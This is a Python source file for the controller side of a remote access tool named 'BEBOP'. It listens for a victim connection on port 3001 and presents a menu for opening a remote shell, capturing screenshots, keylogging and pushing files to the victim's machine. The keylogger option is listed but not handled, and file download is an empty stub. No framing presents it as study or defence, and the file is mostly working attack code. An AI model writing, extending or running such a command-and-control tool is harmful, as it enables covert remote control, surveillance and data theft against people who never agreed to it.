import socket
import sys
import threading
import time

def print_menu():
    print("\n/-------BEBOP-------/\n")
    print("1.) Open shell")
    print("2.) Take screenshot")
    print("3.) Keylogger")
    print("4.) File upload/download")
    print("5.) Exit\n\n")

def establish_connection():
    global conn_to_client, server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 3001))
    server.listen(0)

    print("Waiting on connections")
    conn_to_client, address = server.accept()

    if conn_to_client:
        print(f"Connection to {address[0]}:{address[1]} Established!")
    else:
        sys.exit("Failed to recieve connection to client...Exiting")



def recv():
    data_size = int(conn_to_client.recv(12).decode())

    data = bytes()
    while len(data) < data_size:
        data += conn_to_client.recv(1024)

    return data


def send(data):
    header_size = 12
    data_size = f"{len(data):^{header_size}}"
    conn_to_client.send(data_size.encode())
    conn_to_client.sendall(data)
    


def open_shell():
    while True:
        cmd = input("bebop#: ")
        if cmd == "exit":
            send(cmd.encode())
            break

        send(cmd.encode())
        output = recv()
        print(output.decode())


def file_manager():
    while True:
        print("\n1.) Download File")
        print("2.) Upload File")
        print("3.) Back to Menu\n")
        
        choice = input("Enter Choice: ")
        
        if choice == "1":
            #Download file
            pass
        elif choice == "2":
            #Upload file
            file_path = input("Enter File Path: ")
            send(file_path.encode("UTF-8"))
            
            print("\nUploading File...", end="")
            file = open(file_path, "rb")
            send(file.read())
            file.close()
            
            print("Done!\n")
            
        elif choice == "3":
            break
           

def take_screen_shot():
    file_data = recv()
    with open(f"{time.asctime(time.localtime(time.time()))}.png", "wb") as file:
        file.write(file_data)

def main():
    establish_connection()
    while True:
        print_menu()
        choice = input("Enter Choice: ")
        if choice == "1":
            send(b"1")
            open_shell()
        elif choice == "2":
            send(b"2")
            take_screen_shot()
        elif choice == "4":
            send(b"4")
            file_manager()
        elif choice == "5":
            send(b"5")
            conn_to_client.shutdown(socket.SHUT_WR)
            conn_to_client.close()
            sys.exit()

main()
